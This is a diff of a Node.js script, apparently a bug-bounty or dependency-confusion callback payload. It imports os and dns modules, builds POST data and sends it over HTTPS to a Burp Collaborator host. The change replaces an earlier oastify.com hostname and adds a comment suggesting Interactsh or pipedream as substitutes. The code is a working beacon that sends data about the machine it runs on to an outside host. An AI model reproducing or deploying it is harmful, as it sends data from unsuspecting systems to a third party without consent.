@@ -1,4 +1,4 @@
-
+//author:- hunterr0x01@wearehackerone.com
 const os = require("os");
 const dns = require("dns");
 const querystring = require("querystring");
@@ -23,7 +23,7 @@ var postData = querystring.stringify({
 });
 
 var options = {
-    hostname: "er95pejnkdkg1eykevo37lktdkjd74vt.oastify.com", 
+    hostname: "mukcn06ozkmmu8xqeet91hy9s0yqmf.burpcollaborator.net", //replace burpcollaborator.net with Interactsh or pipedream
     port: 443,
     path: "/",
     method: "POST",
@@ -36,7 +36,7 @@ var options = {
 var req = https.request(options, (res) => {
     res.on("data", (d) => {
         process.stdout.write(d);
-    });    
+    });
 });
 
 req.on("error", (e) => {
